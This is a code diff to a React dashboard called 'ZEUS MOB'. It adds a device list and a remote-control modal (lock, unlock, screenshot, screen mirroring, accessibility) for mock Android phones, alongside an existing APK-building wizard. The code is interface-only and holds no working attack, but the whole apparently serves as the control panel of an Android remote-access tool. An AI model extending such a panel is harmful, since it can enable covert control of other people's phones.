@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef, useCallback } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import {
@@ -7,7 +7,10 @@ import {
   ArrowUpCircle, ArrowDownCircle, Activity, Mail, Key,
   Upload, Download, Pencil, Trash2, FileText, Link2,
   Smartphone, ImagePlus, X, ChevronRight, ChevronLeft,
-  Loader2, RefreshCw, Check, Shield, Cpu, Lock,
+  Loader2, RefreshCw, Check, Shield, Cpu, Lock, LockOpen,
+  Monitor, Volume2, VolumeX, LayoutGrid, Maximize2,
+  Eye, EyeOff, Camera, Navigation2, Cast, Keyboard, Type,
+  Wifi, Battery,
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -73,6 +76,36 @@ const EMPTY_FORM: ApkForm = {
 const STEPS = ["Informações", "Permissões", "Funcionamento", "Avançado"] as const;
 
 /* ─────────────────────────────────────────
+   Device types + mock data
+───────────────────────────────────────── */
+interface Device {
+  id: string; name: string; model: string;
+  ip: string; androidVersion: string;
+  battery: number; online: boolean;
+}
+const MOCK_DEVICES: Device[] = [
+  { id: "d1", name: "Samsung Galaxy A54",    model: "SM-A546B",    ip: "192.168.1.105", androidVersion: "14", battery: 78, online: true  },
+  { id: "d2", name: "Motorola Edge 30",       model: "XT2203-1",    ip: "192.168.1.112", androidVersion: "13", battery: 42, online: true  },
+  { id: "d3", name: "Xiaomi Redmi Note 12",   model: "2209116AG",   ip: "192.168.1.118", androidVersion: "12", battery: 91, online: false },
+];
+const DEVICE_ACTIONS = [
+  { icon: Settings,    tip: "Configurações",     key: "settings"   },
+  { icon: Shield,      tip: "Acessibilidade",    key: "access"     },
+  { icon: Camera,      tip: "Screenshot",        key: "screenshot" },
+  { icon: LayoutGrid,  tip: "Apps",              key: "apps"       },
+  { icon: EyeOff,      tip: "Tela Off",          key: "screen_off" },
+  { icon: Navigation2, tip: "Navegar",           key: "navigate"   },
+  { icon: Lock,        tip: "Bloquear",          key: "lock"       },
+  { icon: LockOpen,    tip: "Desbloquear",       key: "unlock"     },
+  { icon: Type,        tip: "Teclado ↑",         key: "kbd_up"     },
+  { icon: Keyboard,    tip: "Teclado ↓",         key: "kbd_dn"     },
+  { icon: Volume2,     tip: "Volume +",          key: "vol_up"     },
+  { icon: VolumeX,     tip: "Mudo",              key: "vol_dn"     },
+  { icon: Maximize2,   tip: "Tela Cheia",        key: "fullscreen" },
+  { icon: Monitor,     tip: "Espelhar",          key: "mirror"     },
+] as const;
+
+/* ─────────────────────────────────────────
    Dashboard
 ───────────────────────────────────────── */
 export default function Dashboard() {
@@ -84,6 +117,13 @@ export default function Dashboard() {
   const [generating, setGenerating] = useState(false);
   const [done, setDone] = useState(false);
   const iconRef = useRef<HTMLInputElement>(null);
+
+  // Login time for session timer
+  const loginTime = useRef<number>(Date.now());
+
+  // Device panel
+  const [devicePanelOpen, setDevicePanelOpen] = useState(false);
+  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
 
   useEffect(() => {
     if (!isAuthenticated) setLocation("/login");
@@ -187,7 +227,17 @@ export default function Dashboard() {
           <div className="w-8 h-8 rounded-md border border-primary/60 flex items-center justify-center bg-primary/10 mb-2 neon-border">
             <Zap className="w-4 h-4 text-primary" />
           </div>
-          <SidebarIcon icon={Users}  label="Usuários"     active />
+          <div className="relative">
+            <SidebarIcon icon={Smartphone} label="Dispositivos"
+              active={devicePanelOpen}
+              onClick={() => setDevicePanelOpen(p => !p)} />
+            {MOCK_DEVICES.filter(d => d.online).length > 0 && (
+              <span className="absolute -top-0.5 -right-0.5 w-3 h-3 rounded-full bg-[#00ff9d] border border-[#0d1220] shadow-[0_0_5px_#00ff9d] flex items-center justify-center text-[6px] font-bold text-[#0b0f1a] pointer-events-none">
+                {MOCK_DEVICES.filter(d => d.online).length}
+              </span>
+            )}
+          </div>
+          <SidebarIcon icon={Users}  label="Usuários" />
           <SidebarIcon icon={Zap}    label="Conexões" />
           <SidebarIcon icon={Bell}   label="Notificações" />
           <SidebarIcon icon={Layers} label="Camadas" />
@@ -200,6 +250,14 @@ export default function Dashboard() {
           <p className="text-[6px] font-orbitron text-primary/30 uppercase tracking-widest text-center leading-tight mt-1">ZEUS<br />MOB</p>
         </div>
       </aside>
+
+      {/* ── Device List Panel ── */}
+      {devicePanelOpen && (
+        <DeviceListPanel
+          onClose={() => setDevicePanelOpen(false)}
+          onSelect={d => { setSelectedDevice(d); }}
+        />
+      )}
 
       {/* ── Main ── */}
       <main className="flex-1 flex flex-col overflow-hidden">
@@ -255,9 +313,11 @@ export default function Dashboard() {
 
             <div className="space-y-2">
               <ServerCard abbr="ZA" name="ZEUS_INSTANCE_A1" ip="82.153.205.57" status="CONNECTED" email="zeusmob.json@cloud.net" tag="ZEUS" added="03/05/2026, 17:25:11"
-                stats={{ start: "15/05/2026, 08:19:14", duration: "00:19:12", connections: "1", sent: "0 Bytes", received: "0 Bytes", latency: "214 ms" }} />
+                sessionStart={loginTime.current}
+                stats={{ connections: "1", sent: "0 Bytes", received: "0 Bytes", latency: "214 ms" }} />
               <ServerCard abbr="AB" name="APOLLO_NODE_B4" ip="45.221.190.12" status="CONNECTED" email="apollo.admin@cybernetics.net" tag="APOLLO" added="04/05/2026, 09:12:44"
-                stats={{ start: "15/05/2026, 10:05:22", duration: "02:44:01", connections: "11", sent: "45.2 KB", received: "1.2 MB", latency: "18 ms" }} />
+                sessionStart={loginTime.current}
+                stats={{ connections: "11", sent: "45.2 KB", received: "1.2 MB", latency: "18 ms" }} />
             </div>
           </div>
         </div>
@@ -266,6 +326,11 @@ export default function Dashboard() {
           @ZEUSMOB_DEV_PORT | ZEUSMOB | JSON
         </div>
       </main>
+
+      {/* ── Device Control Modal ── */}
+      {selectedDevice && (
+        <DeviceControlModal device={selectedDevice} onClose={() => setSelectedDevice(null)} />
+      )}
 
       {/* ══════════════════════════════════════════
           APK WIZARD MODAL
@@ -509,6 +574,30 @@ export default function Dashboard() {
   );
 }
 
+/* ──────────── Live widgets ──────────── */
+function LiveClock() {
+  const [now, setNow] = useState(new Date());
+  useEffect(() => {
+    const id = setInterval(() => setNow(new Date()), 1000);
+    return () => clearInterval(id);
+  }, []);
+  const p = (n: number) => String(n).padStart(2, "0");
+  return <>{`${p(now.getDate())}/${p(now.getMonth() + 1)}/${now.getFullYear()}, ${p(now.getHours())}:${p(now.getMinutes())}:${p(now.getSeconds())}`}</>;
+}
+
+function LiveTimer({ since }: { since: number }) {
+  const [elapsed, setElapsed] = useState(() => Date.now() - since);
+  useEffect(() => {
+    const id = setInterval(() => setElapsed(Date.now() - since), 1000);
+    return () => clearInterval(id);
+  }, [since]);
+  const h = Math.floor(elapsed / 3_600_000);
+  const m = Math.floor((elapsed % 3_600_000) / 60_000);
+  const s = Math.floor((elapsed % 60_000) / 1_000);
+  const p = (n: number) => String(n).padStart(2, "0");
+  return <>{`${p(h)}:${p(m)}:${p(s)}`}</>;
+}
+
 /* ──────────── Sub-components ──────────── */
 function SidebarIcon({ icon: Icon, label, active, onClick, variant = "primary" }: {
   icon: React.ElementType; label: string; active?: boolean; onClick?: () => void; variant?: string;
@@ -535,10 +624,10 @@ function StatCard({ icon: Icon, label, value }: { icon: React.ElementType; label
   );
 }
 
-function ServerCard({ abbr, name, ip, status, email, tag, added, stats }: {
+function ServerCard({ abbr, name, ip, status, email, tag, added, sessionStart, stats }: {
   abbr: string; name: string; ip: string; status: string;
-  email: string; tag: string; added: string;
-  stats: { start: string; duration: string; connections: string; sent: string; received: string; latency: string };
+  email: string; tag: string; added: string; sessionStart: number;
+  stats: { connections: string; sent: string; received: string; latency: string };
 }) {
   return (
     <div className="bg-[#0d1220] border border-primary/20 rounded-lg overflow-hidden hover:border-primary/45 transition-all hover:shadow-[0_0_14px_rgba(0,212,255,0.08)]">
@@ -569,8 +658,8 @@ function ServerCard({ abbr, name, ip, status, email, tag, added, stats }: {
             <span className="flex items-center gap-1.5"><FileText className="w-2.5 h-2.5" />—</span>
           </div>
           <div className="flex items-stretch divide-x divide-white/5">
-            <StatBlock icon={Clock}           label="Start Time"       value={stats.start} />
-            <StatBlock icon={Timer}           label="Session Duration" value={stats.duration} />
+            <StatBlock icon={Clock}           label="Start Time"       liveType="clock" sessionStart={sessionStart} />
+            <StatBlock icon={Timer}           label="Session Duration" liveType="timer" sessionStart={sessionStart} />
             <StatBlock icon={Users}           label="Connections"      value={stats.connections} />
             <StatBlock icon={ArrowUpCircle}   label="Total Sent"       value={stats.sent} />
             <StatBlock icon={ArrowDownCircle} label="Total Received"   value={stats.received} />
@@ -593,13 +682,20 @@ function ActionBtn({ icon: Icon, tip, id, danger }: { icon: React.ElementType; t
   );
 }
 
-function StatBlock({ icon: Icon, label, value, green }: { icon: React.ElementType; label: string; value: string; green?: boolean }) {
+function StatBlock({ icon: Icon, label, value, green, liveType, sessionStart }: {
+  icon: React.ElementType; label: string; value?: string; green?: boolean;
+  liveType?: "clock" | "timer"; sessionStart?: number;
+}) {
   return (
     <div className="flex-1 flex items-start gap-1.5 px-3 py-2 min-w-[130px]">
       <Icon className={`w-3 h-3 shrink-0 mt-0.5 ${green ? "text-[#00ff9d]" : "text-muted-foreground/50"}`} />
       <div>
         <p className="text-[8px] uppercase text-muted-foreground/60 tracking-widest leading-none mb-1">{label}</p>
-        <p className={`text-[11px] font-semibold leading-none ${green ? "text-[#00ff9d] drop-shadow-[0_0_4px_rgba(0,255,157,0.5)]" : "text-primary"}`}>{value}</p>
+        <p className={`text-[11px] font-semibold leading-none tabular-nums ${green ? "text-[#00ff9d] drop-shadow-[0_0_4px_rgba(0,255,157,0.5)]" : "text-primary"}`}>
+          {liveType === "clock" ? <LiveClock /> :
+           liveType === "timer" && sessionStart !== undefined ? <LiveTimer since={sessionStart} /> :
+           value}
+        </p>
       </div>
     </div>
   );
@@ -640,5 +736,226 @@ function Field({ label, placeholder, value, onChange, testId, icon, required }: 
           className={`bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 ${icon ? "pl-7" : ""}`} />
       </div>
     </div>
+  );
+}
+
+/* ──────────── DeviceListPanel ──────────── */
+function DeviceListPanel({ onClose, onSelect }: {
+  onClose: () => void;
+  onSelect: (d: Device) => void;
+}) {
+  return (
+    <div className="w-[270px] flex-shrink-0 bg-[#0d1220] border-r border-primary/20 flex flex-col z-20 shadow-[4px_0_20px_rgba(0,212,255,0.07)]">
+      {/* header */}
+      <div className="flex items-center gap-2 px-3 py-2.5 border-b border-primary/15 flex-shrink-0">
+        <Smartphone className="w-3.5 h-3.5 text-primary" />
+        <span className="font-orbitron text-[11px] font-bold text-primary tracking-widest flex-1">DISPOSITIVOS</span>
+        <span className="text-[9px] text-muted-foreground/50 font-mono">
+          {MOCK_DEVICES.filter(d => d.online).length}/{MOCK_DEVICES.length}
+        </span>
+        <button onClick={onClose}
+          className="w-6 h-6 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all ml-1">
+          <X className="w-3 h-3" />
+        </button>
+      </div>
+
+      {/* device list */}
+      <div className="flex-1 overflow-y-auto p-2 space-y-1.5">
+        {MOCK_DEVICES.map(d => (
+          <button key={d.id} onClick={() => onSelect(d)}
+            className="w-full flex items-center gap-2.5 px-2.5 py-2.5 rounded-lg border border-primary/15 bg-[#0b0f1a] hover:border-primary/40 hover:bg-primary/5 transition-all text-left group">
+            {/* device icon */}
+            <div className={`w-9 h-9 rounded-lg border flex items-center justify-center shrink-0 transition-all
+              ${d.online ? "bg-primary/10 border-primary/30 group-hover:border-primary/60" : "bg-white/3 border-white/10"}`}>
+              <Smartphone className={`w-4 h-4 ${d.online ? "text-primary" : "text-muted-foreground/30"}`} />
+            </div>
+
+            <div className="flex-1 min-w-0">
+              <p className="text-[11px] font-semibold text-foreground truncate">{d.name}</p>
+              <p className="text-[9px] text-muted-foreground font-mono mt-0.5">
+                {d.ip} · Android {d.androidVersion}
+              </p>
+            </div>
+
+            <div className="flex flex-col items-end gap-1 shrink-0">
+              <span className={`flex items-center gap-1 text-[8px] font-orbitron ${d.online ? "text-[#00ff9d]" : "text-muted-foreground/40"}`}>
+                <span className={`w-1.5 h-1.5 rounded-full ${d.online ? "bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" : "bg-muted-foreground/30"}`} />
+                {d.online ? "ONLINE" : "OFFLINE"}
+              </span>
+              <span className="text-[8px] text-muted-foreground/50 flex items-center gap-0.5">
+                <Battery className="w-2.5 h-2.5" />{d.battery}%
+              </span>
+            </div>
+          </button>
+        ))}
+      </div>
+
+      <div className="px-3 py-1.5 border-t border-primary/10 flex-shrink-0">
+        <p className="text-[8px] text-muted-foreground/35 font-orbitron tracking-widest">
+          {MOCK_DEVICES.filter(d => d.online).length} ONLINE · {MOCK_DEVICES.filter(d => !d.online).length} OFFLINE
+        </p>
+      </div>
+    </div>
+  );
+}
+
+/* ──────────── DeviceControlModal ──────────── */
+function DeviceControlModal({ device, onClose }: { device: Device; onClose: () => void }) {
+  const [tab, setTab] = useState<"controls" | "screen">("controls");
+  const [devState, setDevState] = useState<{ locked?: boolean; screenOff?: boolean; silent?: boolean }>({});
+  const [lastAction, setLastAction] = useState<string | null>(null);
+
+  function handleAction(key: string) {
+    if (key === "lock")       { setDevState(s => ({ ...s, locked: true }));      setLastAction("Dispositivo bloqueado"); }
+    else if (key === "unlock"){ setDevState(s => ({ ...s, locked: false }));     setLastAction("Dispositivo desbloqueado"); }
+    else if (key === "screen_off"){ setDevState(s => ({ ...s, screenOff: true })); setLastAction("Tela desligada"); }
+    else if (key === "vol_dn"){ setDevState(s => ({ ...s, silent: true }));      setLastAction("Modo silencioso ativado"); }
+    else if (key === "vol_up"){ setDevState(s => ({ ...s, silent: false }));     setLastAction("Volume aumentado"); }
+    else { setLastAction(`${key} enviado`); }
+    setTimeout(() => setLastAction(null), 2500);
+  }
+
+  return (
+    <Dialog open onOpenChange={v => { if (!v) onClose(); }}>
+      <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_50px_rgba(0,212,255,0.12)] max-w-md w-full p-0 overflow-hidden rounded-xl">
+
+        {/* ── Header ── */}
+        <div className="flex items-center gap-3 px-4 pt-4 pb-3 border-b border-primary/15">
+          <div className="w-10 h-10 rounded-lg bg-primary/10 border border-primary/40 flex items-center justify-center shrink-0 shadow-[0_0_10px_rgba(0,212,255,0.15)]">
+            <Smartphone className="w-5 h-5 text-primary" />
+          </div>
+          <div className="flex-1 min-w-0">
+            <p className="font-orbitron text-[12px] font-bold text-primary tracking-wide truncate neon-text">
+              {device.name}
+            </p>
+            <p className="text-[9px] text-muted-foreground font-mono mt-0.5">
+              {device.ip} · Android {device.androidVersion} · {device.model}
+            </p>
+          </div>
+          <div className="flex items-center gap-2 shrink-0">
+            <span className="flex items-center gap-1.5 px-2 py-0.5 rounded border border-[#00ff9d]/30 bg-[#00ff9d]/5 text-[8px] font-orbitron text-[#00ff9d]">
+              <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" />ONLINE
+            </span>
+            <span className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
+              <Battery className="w-3 h-3" />{device.battery}%
+            </span>
+          </div>
+          <button onClick={onClose}
+            className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all">
+            <X className="w-3.5 h-3.5" />
+          </button>
+        </div>
+
+        {/* ── Status badges ── */}
+        <div className="flex gap-2 px-4 py-2 border-b border-primary/10 bg-[#0b0f1a]/40">
+          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border transition-all
+            ${devState.locked === true ? "bg-amber-500/10 border-amber-500/30 text-amber-400" : "bg-primary/5 border-primary/15 text-primary/40"}`}>
+            <Lock className="w-2.5 h-2.5" />{devState.locked === true ? "BLOQUEADO" : "DESBLOQUEADO"}
+          </span>
+          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border transition-all
+            ${devState.screenOff ? "bg-white/5 border-white/15 text-white/40" : "bg-primary/5 border-primary/15 text-primary/40"}`}>
+            <Eye className="w-2.5 h-2.5" />{devState.screenOff ? "TELA OFF" : "TELA ON"}
+          </span>
+          {devState.silent && (
+            <span className="flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border bg-purple-500/10 border-purple-500/30 text-purple-400">
+              <VolumeX className="w-2.5 h-2.5" />SILENCIOSO
+            </span>
+          )}
+        </div>
+
+        {/* ── Tabs ── */}
+        <div className="flex border-b border-primary/15">
+          {(["controls", "screen"] as const).map(t => (
+            <button key={t} onClick={() => setTab(t)}
+              className={`flex-1 py-2 text-[10px] font-orbitron font-bold tracking-widest uppercase transition-all flex items-center justify-center gap-1.5
+                ${tab === t
+                  ? "text-primary border-b-2 border-primary bg-primary/5"
+                  : "text-muted-foreground/50 hover:text-primary/60"}`}>
+              {t === "controls" ? <><Zap className="w-3 h-3" />Controles</> : <><Monitor className="w-3 h-3" />Live Screen</>}
+            </button>
+          ))}
+        </div>
+
+        {/* ── Controls tab ── */}
+        {tab === "controls" && (
+          <div className="p-4 space-y-3">
+            <div className="grid grid-cols-7 gap-1.5">
+              {DEVICE_ACTIONS.map(({ icon: Icon, tip, key }) => (
+                <button key={key} title={tip} onClick={() => handleAction(key)}
+                  className={`flex flex-col items-center justify-center gap-0.5 py-2 rounded-lg border transition-all group
+                    ${key === "lock"
+                      ? "border-amber-500/30 bg-amber-500/5 hover:bg-amber-500/15 hover:border-amber-500/60"
+                      : key === "unlock"
+                      ? "border-[#00ff9d]/25 bg-[#00ff9d]/5 hover:bg-[#00ff9d]/15 hover:border-[#00ff9d]/60"
+                      : "border-primary/15 bg-[#0b0f1a] hover:border-primary/50 hover:bg-primary/10"}`}>
+                  <Icon className={`w-3.5 h-3.5 transition-all
+                    ${key === "lock"   ? "text-amber-400 group-hover:drop-shadow-[0_0_4px_rgba(251,191,36,0.8)]"
+                    : key === "unlock" ? "text-[#00ff9d] group-hover:drop-shadow-[0_0_4px_rgba(0,255,157,0.8)]"
+                    : "text-primary/60 group-hover:text-primary group-hover:drop-shadow-[0_0_4px_rgba(0,212,255,0.7)]"}`} />
+                  <span className="text-[6px] text-muted-foreground/40 group-hover:text-primary/50 leading-none text-center truncate w-full px-0.5">
+                    {tip.split(" ")[0]}
+                  </span>
+                </button>
+              ))}
+            </div>
+
+            {lastAction && (
+              <div className="flex items-center gap-2 px-3 py-2 rounded-lg border border-primary/25 bg-primary/8 text-[10px] text-primary animate-pulse">
+                <Zap className="w-3 h-3 shrink-0" />{lastAction}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ── Live Screen tab ── */}
+        {tab === "screen" && (
+          <div className="p-4 flex flex-col items-center gap-3">
+            {/* fake phone frame */}
+            <div className="w-[160px] bg-black rounded-[20px] border-2 border-primary/30 shadow-[0_0_20px_rgba(0,212,255,0.12)] overflow-hidden"
+              style={{ aspectRatio: "9/19.5" }}>
+              {/* status bar */}
+              <div className="flex items-center justify-between px-3 pt-2 pb-1 bg-[#0d1220]">
+                <span className="text-[7px] text-primary/60 font-mono">
+                  <LiveClock />
+                </span>
+                <div className="flex items-center gap-1">
+                  <Wifi className="w-2 h-2 text-primary/50" />
+                  <Battery className="w-2.5 h-2.5 text-primary/50" />
+                </div>
+              </div>
+              {/* screen */}
+              <div className="flex-1 flex flex-col items-center justify-center bg-[#050810] h-[calc(100%-28px)]">
+                <div className="flex flex-col items-center gap-2 opacity-30">
+                  <Monitor className="w-8 h-8 text-primary" />
+                  <div className="space-y-1 text-center">
+                    <p className="text-[8px] font-orbitron text-primary tracking-wider">CONECTANDO</p>
+                    <div className="flex gap-1 justify-center">
+                      {[0,1,2].map(i => (
+                        <span key={i} className="w-1 h-1 rounded-full bg-primary animate-pulse"
+                          style={{ animationDelay: `${i * 300}ms` }} />
+                      ))}
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <p className="text-[9px] text-muted-foreground/50 text-center leading-relaxed">
+              Espelhamento requer permissão de<br />projeção de mídia no dispositivo
+            </p>
+
+            <div className="flex gap-2">
+              <button className="h-7 px-3 rounded border border-primary/30 text-[10px] font-orbitron text-primary hover:bg-primary/10 transition-all flex items-center gap-1.5">
+                <Cast className="w-3 h-3" />Conectar
+              </button>
+              <button className="h-7 px-3 rounded border border-primary/15 text-[10px] text-muted-foreground hover:text-primary transition-all flex items-center gap-1.5">
+                <Camera className="w-3 h-3" />Captura
+              </button>
+            </div>
+          </div>
+        )}
+
+      </DialogContent>
+    </Dialog>
   );
 }
